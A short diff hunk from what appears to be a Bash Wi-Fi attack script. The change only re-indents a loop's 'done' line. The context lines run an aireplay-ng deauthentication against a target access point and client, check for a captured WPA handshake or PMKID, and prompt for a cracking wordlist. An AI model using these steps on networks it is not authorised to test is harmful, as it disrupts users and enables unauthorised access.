@@ -875,7 +875,7 @@ while true; do
 								xterm -e aireplay-ng -a "$BSSD" -c "$STN" --deauth 1 "$WFDM" &
 								echo "Is the WPA handshake completed or PMKID found?"
 								read -p "(Y/n, default is n): " RSP
-								done
+							done
 							airmon-ng stop "$WFDM"
 							echo "Digit a password wordlist file"
 							read -p "(example, /usr/share/wordlists/rockyou.txt): " WRDL
